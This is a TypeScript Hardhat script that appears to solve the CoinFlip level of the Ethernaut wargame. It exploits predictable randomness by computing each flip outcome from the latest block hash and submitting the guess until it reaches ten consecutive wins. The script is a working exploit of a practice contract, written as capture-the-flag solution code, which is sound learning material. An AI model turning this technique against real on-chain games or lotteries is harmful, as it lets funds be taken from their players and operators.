import { ethers } from 'hardhat';
import { BigNumber } from 'ethers';

async function main() {
  const problemAddress = "0xffdC60280456E652CE2331944E74Ec79d9b9359D";
  const coinFlip = await ethers.getContractAt("CoinFlip", problemAddress);

  const factor = BigNumber.from("57896044618658097711785492504343953926634992332820282019728792003956564819968");

  let lastBlockNumber = ethers.provider.blockNumber;

  // when generated new block then flip the coin.
  const interval = setInterval(async () => {
    const winningStreak = await coinFlip.consecutiveWins();
    console.log("Your winning streak is : " + winningStreak.toNumber());
    if(winningStreak.toNumber() < 10) {
      const blockNumber = ethers.provider.blockNumber;
      if(lastBlockNumber !== blockNumber) {
        lastBlockNumber = blockNumber;
        const blockHash = (await ethers.provider.getBlock(blockNumber)).hash;
        const blockValue = BigNumber.from(blockHash);
        const choiceOfGod = blockValue.div(factor).eq(BigNumber.from(1));
        await coinFlip.flip(choiceOfGod);
      }
    } else {
      clearInterval(interval);
    }
  }, 500)
}

main().catch(err => {
  console.log(err);
  process.exitCode = 1;
})
